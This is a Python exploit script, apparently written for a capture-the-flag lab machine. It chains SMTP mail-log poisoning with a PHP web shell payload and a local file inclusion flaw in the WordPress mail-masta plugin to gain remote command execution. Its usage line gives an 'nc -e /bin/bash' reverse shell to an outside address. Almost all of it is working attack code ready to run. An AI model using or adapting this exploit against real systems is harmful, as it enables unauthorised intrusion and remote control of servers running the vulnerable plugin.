#!/usr/bin/python
# -*- coding: iso-8859-15 -*-
import requests
import sys
import socket
import time
from telnetlib import Telnet

banner = ""
banner += " ██░ ██ ▓█████  ██▓     ██▓ ▒█████    ██████ \n"
banner += "▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒▒██▒  ██▒▒██    ▒ \n"
banner += "▒██▀▀██░▒███   ▒██░    ▒██▒▒██░  ██▒░ ▓██▄   \n"
banner += "░▓█ ░██ ▒▓█  ▄ ▒██░    ░██░▒██   ██░  ▒   ██▒\n"
banner += "░▓█▒░██▓░▒████▒░██████▒░██░░ ████▓▒░▒██████▒▒\n"
banner += " ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░▓  ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░\n"
banner += " ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░ ▒ ░  ░ ▒ ▒░ ░ ░▒  ░ ░\n"
banner += " ░  ░░ ░   ░     ░ ░    ▒ ░░ ░ ░ ▒  ░  ░  ░  \n"
banner += " ░  ░  ░   ░  ░    ░  ░ ░      ░ ░        ░  coded by Silky"
                                             


usage = '''
Usage: python helios-exploit.py "command"

example: python helios-exploit.py "nc -e /bin/bash 10.0.0.1 1234"

'''


#rev shell
try:
	cmd = sys.argv[1]
except:
	print(banner)
	print(usage)
	sys.exit(0)
####  Pentest Monkey RevShell
mail ='''MAIL FROM: <raj>
RCPT TO: Helios
data'''

payload ="<?php system($_GET['c']); ?> \n"

test = Telnet('192.168.178.62', 25)
print(banner)
print ("\n[+] Start your nc listener")
print ("[+] Paste the first three lines in and hit Return, then enter the payload shown below and hit return,")
print ("[+] Enter a single dot and hit return, if '250 2.0.0 Ok: queued as ....' appears hit ctrl-c\n")

print("[+] Paste these three lines in:")
print(mail +"\n")



print("[+] Payload starts here")
print(payload)



try:
	test.interact()
except KeyboardInterrupt:
	test.close()
	
try:
#### Local File Inclusion in Wordpress mail-masta plugin
	print("[+] Triggering RCE")
	LFI ="http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=" +cmd 



	r =requests.get(LFI)
	data = r.content
	print data
except:
	sys.exit(0)